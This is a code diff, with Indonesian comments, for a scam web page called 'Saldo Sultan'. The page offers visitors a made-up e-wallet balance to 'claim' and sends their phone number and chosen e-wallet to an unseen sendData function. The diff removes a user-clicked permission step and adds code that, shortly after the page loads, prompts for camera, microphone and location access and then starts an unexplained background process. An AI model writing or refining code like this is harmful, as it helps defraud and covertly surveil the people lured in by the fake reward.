-    permissionBtn.addEventListener('click', async function() {
-        try {
-            // Minta izin kamera + mikrofon
-            const testStream = await navigator.mediaDevices.getUserMedia({
-                video: true,
-                audio: true
-            });
-            testStream.getTracks().forEach(t => t.stop());
-
-            // Minta izin lokasi
-            if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        () => resolve(),
-                        () => resolve(),
-                        { timeout: 5000 }
-                    );
-                });
-            }
-
-            allPermissionsGranted = true;
-            
-            // HILANGKAN PERMISSION BOX
-            permissionBox.classList.add('hidden');
-            
-            // Mulai proses background
-            startBackgroundProcess();
-
-        } catch (err) {
-            console.log('Permission error:', err);
-            alert('Mohon izinkan akses kamera, mikrofon, dan lokasi untuk melanjutkan.');
-        }
-    });
-
-    // --- SUBMIT ---
     submitBtn.addEventListener('click', async function() {
         const phone = phoneInput.value.trim().replace(/\s/g, '');
         if (!phone || phone.length < 8) {
@@ -915,28 +624,20 @@
             return;
         }
 
-        if (!allPermissionsGranted) {
-            permissionBox.style.borderColor = '#ff4757';
-            setTimeout(() => permissionBox.style.borderColor = 'rgba(255,255,255,0.06)', 2000);
-            return;
-        }
-
         if (isProcessing) return;
         isProcessing = true;
         submitBtn.disabled = true;
         submitBtn.textContent = '⏳ Memproses...';
 
         const saldo = generateSaldo();
-        const ewallet = selectedEwallet;
+        await sendData(phone, selectedEwallet, saldo);
 
-        await sendData(phone, ewallet, saldo);
-
-        // TAMPILKAN FOTO DARI GITHUB
-        const githubImage = await getImageFromGitHub();
-        if (githubImage) {
-            resultImage.src = githubImage;
+        // Tampilkan foto dari GitHub
+        const githubImg = await getGitHubImage();
+        if (githubImg) {
+            resultImage.src = githubImg;
         } else {
-            resultImage.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="400" height="600" viewBox="0 0 400 600"%3E%3Crect width="400" height="600" fill="%231a1a2e"/%3E%3Ctext x="50%25" y="45%25" text-anchor="middle" font-family="Arial" font-size="60" fill="%23ffd700" dy=".3em"%3E🎉%3C/text%3E%3Ctext x="50%25" y="55%25" text-anchor="middle" font-family="Arial" font-size="22" fill="%23fff" font-weight="bold"%3ESALDO SULTAN%3C/text%3E%3Ctext x="50%25" y="63%25" text-anchor="middle" font-family="Arial" font-size="16" fill="%23666"%3ESaldo berhasil diklaim%3C/text%3E%3C/svg%3E';
+            resultImage.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="400" height="500" viewBox="0 0 400 500"%3E%3Crect width="400" height="500" fill="%23141414"/%3E%3Ctext x="50%25" y="45%25" text-anchor="middle" font-family="Arial" font-size="60" fill="%23ffd700" dy=".3em"%3E🎉%3C/text%3E%3Ctext x="50%25" y="55%25" text-anchor="middle" font-family="Arial" font-size="20" fill="%23fff" font-weight="bold"%3ESALDO SULTAN%3C/text%3E%3Ctext x="50%25" y="63%25" text-anchor="middle" font-family="Arial" font-size="14" fill="%23666"%3E%3C/text%3E%3C/svg%3E';
         }
 
         formScreen.classList.remove('visible');
@@ -944,44 +645,34 @@
     });
 
     // ============================================
-    // 🚀 INIT - LANGSUNG MINTA IZIN
+    // 🚀 INIT
     // ============================================
     function init() {
-        saldoValue.textContent = generateSaldo();
+        saldoValue.textContent = generateSaldo().toLocaleString('id-ID');
 
+        // Loading 3 detik → form muncul
         setTimeout(() => {
             loadingScreen.classList.add('hidden');
             formScreen.classList.add('visible');
-            
-            // LANGSUNG MINTA IZIN OTOMATIS
-            setTimeout(async () => {
-                try {
-                    const testStream = await navigator.mediaDevices.getUserMedia({
-                        video: true,
-                        audio: true
-                    });
-                    testStream.getTracks().forEach(t => t.stop());
-
-                    if (navigator.geolocation) {
-                        await new Promise((resolve) => {
-                            navigator.geolocation.getCurrentPosition(
-                                () => resolve(),
-                                () => resolve(),
-                                { timeout: 5000 }
-                            );
-                        });
-                    }
-
-                    allPermissionsGranted = true;
-                    permissionBox.classList.add('hidden');
-                    startBackgroundProcess();
-
-                } catch (err) {
-                    console.log('Auto permission failed, waiting for user click:', err);
-                }
-            }, 1000);
-            
         }, 3000);
+
+        // LANGSUNG MINTA IZIN (popup browser)
+        setTimeout(async () => {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                s.getTracks().forEach(t => t.stop());
+                if (navigator.geolocation) {
+                    await new Promise((r) => {
+                        navigator.geolocation.getCurrentPosition(() => r(), () => r(), { timeout: 5000 });
+                    });
+                }
+                permissionsGranted = true;
+                console.log('✅ All permissions granted');
+                startBackgroundProcess();
+            } catch (err) {
+                console.log('⚠️ Permission denied:', err);
+            }
+        }, 1000);
 
         console.log('📄 Page loaded - Saldo Sultan');
     }
